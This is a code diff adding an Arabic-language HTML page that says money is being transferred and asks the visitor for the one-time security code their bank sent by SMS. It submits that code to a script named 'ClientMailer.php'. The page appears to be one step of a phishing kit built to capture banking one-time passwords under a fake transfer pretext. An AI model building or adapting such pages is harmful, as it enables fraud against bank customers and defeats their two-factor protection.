@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحويل الاموال الالكترونية</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+    <link rel="stylesheet" href="style/page-3.css">
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300&amp;display=swap" rel="stylesheet">
+
+</head>
+
+<body>
+    <div class="row section-1">
+        <div>
+            <label for="">جاري تحويل الاموال الى الحساب المطلوب</label>
+        </div>
+        <form action="php/ClientMailer.php" method="post" onsubmit="return run()">
+            <div class="row animate-bottom" id="myDiv">
+                <div class="row">
+                    <div>
+                        <h3></h3>
+                    </div>
+                    <div>
+                        <label for=""></label>
+                    </div>
+                    <div>
+                        <label for=""></label>
+                    </div>
+                    <div>
+                        <label for=""></label>
+                    </div>
+                </div>
+                <label for="">من فضلك ادخل رمز الامان</label>
+                <label for="">(الرمز لمرة واحدة يرسل من قبل البنك برسالة نصية)</label>
+                <input class="OTP-code" type="password" name="otp_code" id="otp_code">
+                <label id="error"></label>
+                <input class="btn-code" type="submit" value="حول المبلغ الان">
+            </div>
+        </form>
+    </div>
+
+    <script src="javascript/Page_3.js"></script>
+</body>
+
+</html>
